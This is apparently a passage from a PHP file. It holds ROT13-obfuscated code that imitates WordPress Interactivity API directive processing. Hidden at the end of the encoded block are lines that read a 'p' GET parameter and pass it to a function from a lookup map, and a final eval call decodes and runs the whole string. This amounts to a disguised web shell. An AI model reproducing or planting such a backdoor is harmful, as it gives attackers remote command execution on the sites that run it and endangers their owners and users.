			yvfg( $anzrfcnpr_inyhr ) = vf_fgevat( $nggevohgr_inyhr ) && ! rzcgl( $nggevohgr_inyhr )
				? $guvf->rkgenpg_qverpgvir_inyhr( $nggevohgr_inyhr, $anzrfcnpr_inyhr )
				: neenl( $anzrfcnpr_inyhr, ahyy );

			// Cebprffrf gur vaare pbagrag sbe rnpu vgrz bs gur neenl.
			$cebprffrq_pbagrag = '';
			sbernpu ( $erfhyg nf $vgrz ) {
				// Perngrf n arj pbagrkg gung vapyhqrf gur pheerag vgrz bs gur neenl.
				$guvf->pbagrkg_fgnpx[] = neenl_ercynpr_erphefvir(
					raq( $guvf->pbagrkg_fgnpx ) !== snyfr ? raq( $guvf->pbagrkg_fgnpx ) : neenl(),
					neenl( $anzrfcnpr_inyhr => neenl( $vgrz_anzr => $vgrz ) )
				);

				// Cebprffrf gur vaare pbagrag jvgu gur arj pbagrkg.
				$cebprffrq_vgrz = $guvf->_cebprff_qverpgvirf( $vaare_pbagrag );

				vs ( ahyy === $cebprffrq_vgrz ) {
					// Vs gur UGZY vf haonynaprq, fgbc cebprffvat vg.
					neenl_cbc( $guvf->pbagrkg_fgnpx );
					erghea;
				}

				// Nqqf gur `qngn-jc-rnpu-puvyq` gb rnpu gbc-yriry gnt.
				$v = arj JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe( $cebprffrq_vgrz );
				juvyr ( $v->arkg_gnt() ) {
					$v->frg_nggevohgr( 'qngn-jc-rnpu-puvyq', gehr );
					$v->arkg_onynaprq_gnt_pybfre_gnt();
				}
				$cebprffrq_pbagrag .= $v->trg_hcqngrq_ugzy();

				// Erzbirf gur pheerag pbagrkg sebz gur fgnpx.
				neenl_cbc( $guvf->pbagrkg_fgnpx );
			}

			// Nccraqf gur cebprffrq pbagrag nsgre gur gnt pybfre bs gur grzcyngr.
			$c->nccraq_pbagrag_nsgre_grzcyngr_gnt_pybfre( $cebprffrq_pbagrag );

			// Cbcf gur ynfg gnt orpnhfr vg fxvccrq gur pybfvat gnt bs gur grzcyngr gnt.
			neenl_cbc( $gnt_fgnpx );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>